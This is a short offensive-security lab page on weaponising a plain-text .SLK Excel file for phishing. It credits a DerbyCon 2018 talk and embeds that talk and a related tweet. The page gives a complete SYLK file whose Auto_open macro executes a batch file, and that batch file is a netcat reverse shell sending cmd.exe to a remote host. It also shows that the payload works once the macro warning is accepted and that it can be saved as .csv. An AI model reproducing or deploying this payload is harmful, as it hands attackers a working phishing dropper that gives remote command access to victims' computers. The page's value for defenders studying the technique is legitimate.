# Phishing: .SLK Excel

This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked)

## Weaponization

Create an new text file, put the the below code and save it as .slk file:

{% code-tabs %}
{% code-tabs-item title="demo.slk" %}
```text
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/slk-text.png)

Note that the shell.cmd refers to a simple nc reverse shell batch file:

{% code-tabs %}
{% code-tabs-item title="c:\\shell.cmd" %}
```text
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Execution

Once the macro warning is dismissed, the reverse shell pops as expected:

![](../../.gitbook/assets/slk-shell.gif)

Since the file is actually a plain text file, detecting/triaging malicious intents are made easier.

## Bonus

Note that the payload file could be saved as a .csv - note the additional warning though:

![](../../.gitbook/assets/slk-csv.png)

{% embed data="{\"url\":\"https://www.youtube.com/watch?v=xY2DIRfqNvA\",\"type\":\"video\",\"title\":\"Track 3 18 The MS Office Magic Show Stan Hegt Pieter Ceelen\",\"description\":\"These are the videos from Derbycon 2018:\\nhttp://www.irongeek.com/i.php?page=videos/derbycon8/mainlist\\n\\nPatreon:\\nhttps://www.patreon.com/irongeek\",\"icon\":{\"type\":\"icon\",\"url\":\"https://www.youtube.com/yts/img/favicon\_144-vfliLAfaB.png\",\"width\":144,\"height\":144,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://i.ytimg.com/vi/xY2DIRfqNvA/maxresdefault.jpg\",\"width\":1280,\"height\":720,\"aspectRatio\":0.5625},\"embed\":{\"type\":\"player\",\"url\":\"https://www.youtube.com/embed/xY2DIRfqNvA?rel=0&showinfo=0\",\"html\":\"<div style=\\\"left: 0; width: 100%; height: 0; position: relative; padding-bottom: 56.2493%;\\\"><iframe src=\\\"https://www.youtube.com/embed/xY2DIRfqNvA?rel=0&amp;showinfo=0\\\" style=\\\"border: 0; top: 0; left: 0; width: 100%; height: 100%; position: absolute;\\\" allowfullscreen scrolling=\\\"no\\\"></iframe></div>\",\"aspectRatio\":1.7778}}" %}

[http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen](http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen)

{% embed data="{\"url\":\"https://twitter.com/StanHacked/status/1049047727403937795\",\"type\":\"rich\",\"title\":\"Stan Hegt on Twitter\",\"description\":\"Pop calc.exe via Excel file of less than 100 bytes in size. Circumventing protected view! Put the following lines in a .slk file and accept the Excel macro warning. More magic in the @derbycon presentation of @ptrpieter and myself. Recording via @irongeek\_adc will be online soon! pic.twitter.com/ibsmqrj5S9— Stan Hegt \(@StanHacked\) October 7, 2018\\n\\n\",\"icon\":{\"type\":\"icon\",\"url\":\"https://abs.twimg.com/icons/apple-touch-icon-192x192.png\",\"width\":192,\"height\":192,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://pbs.twimg.com/media/Do717YQWwAAeXAQ.jpg:large\",\"width\":1536,\"height\":802,\"aspectRatio\":0.5221354166666666},\"embed\":{\"type\":\"app\",\"html\":\"<blockquote class=\\\"twitter-tweet\\\" data-dnt=\\\"true\\\" align=\\\"center\\\"><p lang=\\\"en\\\" dir=\\\"ltr\\\">Pop calc.exe via Excel file of less than 100 bytes in size. Circumventing protected view! Put the following lines in a .slk file and accept the Excel macro warning. More magic in the <a href=\\\"https://twitter.com/DerbyCon?ref\_src=twsrc%5Etfw\\\">@derbycon</a> presentation of <a href=\\\"https://twitter.com/ptrpieter?ref\_src=twsrc%5Etfw\\\">@ptrpieter</a> and myself. Recording via <a href=\\\"https://twitter.com/irongeek\_adc?ref\_src=twsrc%5Etfw\\\">@irongeek\_adc</a> will be online soon! <a href=\\\"https://t.co/ibsmqrj5S9\\\">pic.twitter.com/ibsmqrj5S9</a></p>&mdash; Stan Hegt \(@StanHacked\) <a href=\\\"https://twitter.com/StanHacked/status/1049047727403937795?ref\_src=twsrc%5Etfw\\\">October 7, 2018</a></blockquote>\\n<script async src=\\\"https://platform.twitter.com/widgets.js\\\" charset=\\\"utf-8\\\"></script>\\n\",\"maxWidth\":550,\"aspectRatio\":null}}" %}



